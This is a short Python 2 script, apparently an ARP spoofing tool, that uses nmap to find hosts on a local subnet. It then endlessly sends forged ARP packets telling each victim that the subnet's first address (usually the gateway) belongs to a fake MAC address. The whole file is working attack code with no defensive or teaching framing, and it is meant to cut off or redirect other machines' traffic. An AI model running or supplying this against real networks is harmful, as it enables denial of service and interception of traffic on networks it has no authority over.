import time
import sys
import socket
import struct
from scapy.all import *
import nmap


def get_all_host_in_local_network(ipprefix, mask_len):
    nm = nmap.PortScanner()
    hosts = ipprefix + '/' + mask_len
    nm.scan(hosts=hosts, arguments='-p 161 -sU ')

    hosts_list = [x for x in nm.all_hosts()]
    print hosts_list
    return hosts_list


def get_my_ip():
    try:
        csock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        csock.connect(('8.8.8.8', 80))
        (addr, port) = csock.getsockname()
        csock.close()
        return addr
    except socket.error:
        return "127.0.0.1"


def int_to_ip(int_ip):
    return socket.inet_ntoa(struct.pack('I', socket.htonl(int_ip)))


def ip_to_int(ip):
    return socket.ntohl(struct.unpack("I", socket.inet_aton(str(ip)))[0])


def genetate_host_ip(int_ip, mask_len):
    _len = 32 - int(mask_len)
    host_list = []

    for i in xrange(2**_len):
        host_list.append(int_to_ip(int_ip + i))

    return host_list


def ARPAttack(ipprefix, mask_len, mac='12:34:56:78:1a:bc'):
    request = 1
    int_ip = ip_to_int(ipprefix)
    spoof = int_to_ip(int_ip+1)
    victim_list = get_all_host_in_local_network(ipprefix, mask_len)
    host_ip = get_my_ip()
    while 1:
        for victim in victim_list:
            if victim == host_ip:
                continue
            arp = ARP(op=request, psrc=spoof, pdst=victim, hwsrc=mac)
            send(arp)
            print "victim: ", victim
            time.sleep(0.001)

if __name__ == "__main__":
    ipprefix = sys.argv[1]
    mask_len = sys.argv[2]
    ARPAttack(ipprefix, mask_len)
